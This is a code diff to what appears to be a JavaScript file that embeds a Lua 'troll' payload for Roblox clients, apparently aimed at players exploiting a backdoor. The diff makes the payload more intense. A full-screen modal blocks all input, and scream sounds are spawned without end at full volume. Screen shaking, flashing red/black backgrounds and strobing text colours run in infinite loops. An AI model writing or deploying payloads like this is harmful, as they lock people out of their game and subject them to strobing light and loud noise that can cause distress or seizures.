@@ -35,49 +35,92 @@ const trollPayload = `
 if game:GetService("Players").LocalPlayer then
     local player = game:GetService("Players").LocalPlayer
     local gui = Instance.new("ScreenGui")
-    gui.Name = "STOP"
+    gui.Name = "UltimateTrollGui"
     gui.ResetOnSpawn = false
     gui.Parent = player:WaitForChild("PlayerGui")
 
     local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(1, 0, 1, 0)
-    frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    frame.Size = UDim2.new(1,0,1,0)
+    frame.Position = UDim2.new(0,0,0,0)
+    frame.BackgroundColor3 = Color3.new(1,0,0)
     frame.BorderSizePixel = 0
     frame.Parent = gui
 
-    local inputBlocker = Instance.new("TextButton")
-    inputBlocker.Size = UDim2.new(1, 0, 1, 0)
-    inputBlocker.BackgroundTransparency = 1
-    inputBlocker.Text = ""
-    inputBlocker.Parent = frame
-    inputBlocker.AutoButtonColor = false
-    inputBlocker.Active = true
-    inputBlocker.Selectable = false
-    inputBlocker.Modal = true
+    -- Input blocker
+    local blocker = Instance.new("TextButton")
+    blocker.Size = UDim2.new(1,0,1,0)
+    blocker.BackgroundTransparency = 1
+    blocker.Text = ""
+    blocker.Parent = frame
+    blocker.AutoButtonColor = false
+    blocker.Active = true
+    blocker.Selectable = false
+    blocker.Modal = true
 
     local textLabel = Instance.new("TextLabel")
-    textLabel.Size = UDim2.new(1, 0, 0.2, 0)
-    textLabel.Position = UDim2.new(0, 0, 0.4, 0)
+    textLabel.Size = UDim2.new(1,0,0.3,0)
+    textLabel.Position = UDim2.new(0,0,0.35,0)
     textLabel.BackgroundTransparency = 1
-    textLabel.Text = "BACKDOOR GOT REMOVED.\\nSTOP EXPLOITING!"
-    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    textLabel.Text = "COOLKID HAS STOPPED YOU\nFROM EXPLOITING"
+    textLabel.TextColor3 = Color3.new(1,1,1)
+    textLabel.TextStrokeColor3 = Color3.new(0,0,0)
     textLabel.TextStrokeTransparency = 0
     textLabel.Font = Enum.Font.Antique
     textLabel.TextScaled = true
     textLabel.TextWrapped = true
     textLabel.Parent = frame
 
+    -- Sound spam
     spawn(function()
         while true do
-            for i = 0, 1, 0.05 do
-                textLabel.TextColor3 = Color3.new(1, 1 - i, 1 - i)
+            local sound = Instance.new("Sound")
+            sound.SoundId = "rbxassetid://138186576" -- creepy scream sound
+            sound.Volume = 1
+            sound.Parent = frame
+            sound:Play()
+            -- no wait, spam sounds instantly (many will overlap)
+            wait(0.01) -- minimal wait to avoid script errors
+            sound.Ended:Connect(function() sound:Destroy() end)
+        end
+    end)
+
+    -- Screen shake function
+    local function shake()
+        local amplitude = 20
+        while true do
+            for i = 1, 30 do
+                frame.Position = UDim2.new(0, math.random(-amplitude, amplitude), 0, math.random(-amplitude, amplitude))
+                wait(0.03)
+            end
+            frame.Position = UDim2.new(0,0,0,0)
+            wait(0.1)
+        end
+    end
+    spawn(shake)
+
+    -- Flashing red/black background
+    spawn(function()
+        while true do
+            for i = 0, 1, 0.1 do
+                frame.BackgroundColor3 = Color3.new(1, 0, 0):Lerp(Color3.new(0, 0, 0), i)
                 wait(0.05)
             end
-            for i = 0, 1, 0.05 do
-                textLabel.TextColor3 = Color3.new(1, i, i)
+            for i = 0, 1, 0.1 do
+                frame.BackgroundColor3 = Color3.new(0, 0, 0):Lerp(Color3.new(1, 0, 0), i)
                 wait(0.05)
             end
+        end
+    end)
+
+    -- Glitchy flicker text color effect
+    spawn(function()
+        while true do
+            for i = 1, 10 do
+                textLabel.TextColor3 = Color3.new(math.random(), math.random(), math.random())
+                wait(0.03)
+            end
+            textLabel.TextColor3 = Color3.new(1,1,1)
+            wait(0.3)
         end
     end)
 end
